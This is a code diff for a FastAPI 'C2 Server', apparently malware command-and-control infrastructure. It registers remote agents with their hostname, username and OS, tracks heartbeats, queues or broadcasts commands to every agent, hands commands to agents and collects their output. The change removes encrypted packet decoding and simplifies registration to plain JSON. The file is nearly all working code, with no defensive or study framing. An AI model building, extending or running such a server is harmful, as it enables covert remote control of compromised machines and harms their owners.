@@ -1,21 +1,13 @@
-from fastapi import FastAPI, Request
+from fastapi import FastAPI
 from pydantic import BaseModel
 from sqlalchemy import create_engine, Column, String, Integer
 from sqlalchemy.orm import sessionmaker, declarative_base
 import time
 
-from encryption.crypto import decrypt_message
-from communication.protocol import parse_packet
-
 app = FastAPI()
 
 # DATABASE SETUP
-
-engine = create_engine(
-    "sqlite:///./c2server.db",
-    connect_args={"check_same_thread": False}
-)
-
+engine = create_engine("sqlite:///./c2server.db", connect_args={"check_same_thread": False})
 SessionLocal = sessionmaker(bind=engine)
 Base = declarative_base()
 
@@ -30,7 +22,6 @@ class AgentDB(Base):
     os = Column(String)
     last_seen = Column(Integer)
 
-
 class CommandDB(Base):
     __tablename__ = "commands"
 
@@ -38,14 +29,12 @@ class CommandDB(Base):
     agent_id = Column(String)
     command = Column(String)
 
-
 class OutputDB(Base):
     __tablename__ = "outputs"
 
     id = Column(Integer, primary_key=True, index=True)
     agent_id = Column(String)
     output = Column(String)
-
 
 Base.metadata.create_all(engine)
 
@@ -58,84 +47,50 @@ class Agent(BaseModel):
     os: str
     status: str
 
-
 class Command(BaseModel):
     agent_id: str
     command: str
 
-
 class BroadcastCommand(BaseModel):
     command: str
-
 
 class Output(BaseModel):
     agent_id: str
     output: str
 
-
 class Heartbeat(BaseModel):
     agent_id: str
 
-
 # HOME
+
+@app.get("/")
+async def home():
+    return {"message": "C2 Server Running"}
+
+# REGISTER AGENT
+
 @app.post("/register")
-async def register(request: Request):
-
-    try:
-        body = await request.json()
-        print("BODY RECEIVED:", body)
-
-        payload = body.get("payload")
-
-        if not payload:
-            return {"error": "Missing payload"}
-
-        decrypted = decrypt_message(payload)
-        print("DECRYPTED:", decrypted)
-
-        msg_type, data = parse_packet(decrypted)
-        print("PARSED:", msg_type, data)
-
-        # validate packet
-        if not data:
-            return {"error": "Invalid packet data"}
-
-        agent_id = data.get("agent_id")
-        hostname = data.get("hostname")
-        username = data.get("username")
-        os_name = data.get("os")
-
-        if not agent_id:
-            return {"error": "agent_id missing"}
-
-    except Exception as e:
-        print("REGISTER ERROR:", e)
-        return {"error": str(e)}
+async def register(agent: Agent):
 
     db = SessionLocal()
 
-    try:
-        existing = db.query(AgentDB).filter(
-            AgentDB.agent_id == agent_id
-        ).first()
+    existing = db.query(AgentDB).filter(AgentDB.agent_id == agent.agent_id).first()
 
-        if not existing:
+    if not existing:
+        new_agent = AgentDB(
+            agent_id=agent.agent_id,
+            hostname=agent.hostname,
+            username=agent.username,
+            os=agent.os,
+            last_seen=int(time.time())
+        )
+        db.add(new_agent)
+        db.commit()
 
-            new_agent = AgentDB(
-                agent_id=agent_id,
-                hostname=hostname,
-                username=username,
-                os=os_name,
-                last_seen=int(time.time())
-            )
-
-            db.add(new_agent)
-            db.commit()
-
-    finally:
-        db.close()
+    db.close()
 
     return {"message": "agent registered"}
+
 # HEARTBEAT
 
 @app.post("/heartbeat")
@@ -143,12 +98,9 @@ async def heartbeat(hb: Heartbeat):
 
     db = SessionLocal()
 
-    agent = db.query(AgentDB).filter(
-        AgentDB.agent_id == hb.agent_id
-    ).first()
+    agent = db.query(AgentDB).filter(AgentDB.agent_id == hb.agent_id).first()
 
     if agent:
-
         agent.last_seen = int(time.time())
         db.commit()
 
@@ -156,8 +108,7 @@ async def heartbeat(hb: Heartbeat):
 
     return {"message": "heartbeat received"}
 
-
-# SEND COMMAND
+# SEND COMMAND TO ONE AGENT
 
 @app.post("/command")
 async def send_command(cmd: Command):
@@ -176,8 +127,7 @@ async def send_command(cmd: Command):
 
     return {"message": "command stored"}
 
-
-# BROADCAST COMMAND
+# BROADCAST COMMAND TO ALL AGENTS
 
 @app.post("/broadcast")
 async def broadcast(cmd: BroadcastCommand):
@@ -187,19 +137,16 @@ async def broadcast(cmd: BroadcastCommand):
     agents = db.query(AgentDB).all()
 
     for agent in agents:
-
         new_command = CommandDB(
             agent_id=agent.agent_id,
             command=cmd.command
         )
-
         db.add(new_command)
 
     db.commit()
     db.close()
 
     return {"message": "command broadcast to all agents"}
-
 
 # AGENT FETCH COMMAND
 
@@ -208,17 +155,12 @@ async def get_command(agent_id: str):
 
     db = SessionLocal()
 
-    command = db.query(CommandDB).filter(
-        CommandDB.agent_id == agent_id
-    ).first()
+    command = db.query(CommandDB).filter(CommandDB.agent_id == agent_id).first()
 
     if command:
-
         cmd_text = command.command
-
         db.delete(command)
         db.commit()
-
         db.close()
 
         return {"command": cmd_text}
@@ -227,8 +169,7 @@ async def get_command(agent_id: str):
 
     return {"command": ""}
 
-
-# RECEIVE OUTPUT
+# RECEIVE OUTPUT FROM AGENT
 
 @app.post("/send_output")
 async def receive_output(out: Output):
@@ -247,8 +188,7 @@ async def receive_output(out: Output):
 
     return {"message": "output stored"}
 
-
-# AGENT STATUS
+# CHECK AGENT STATUS
 
 @app.get("/status")
 async def status():
@@ -258,11 +198,9 @@ async def status():
     agents = db.query(AgentDB).all()
 
     current = int(time.time())
-
     result = {}
 
     for a in agents:
-
         if current - a.last_seen < 30:
             result[a.agent_id] = "online"
         else:
@@ -271,7 +209,6 @@ async def status():
     db.close()
 
     return result
-
 
 # VIEW OUTPUTS
 
@@ -285,7 +222,6 @@ async def outputs():
     results = []
 
     for d in data:
-
         results.append({
             "agent_id": d.agent_id,
             "output": d.output
@@ -294,7 +230,6 @@ async def outputs():
     db.close()
 
     return results
-
 
 # DASHBOARD
 
@@ -311,7 +246,6 @@ async def dashboard():
     offline = 0
 
     for a in agents:
-
         if current - a.last_seen < 30:
             online += 1
         else:
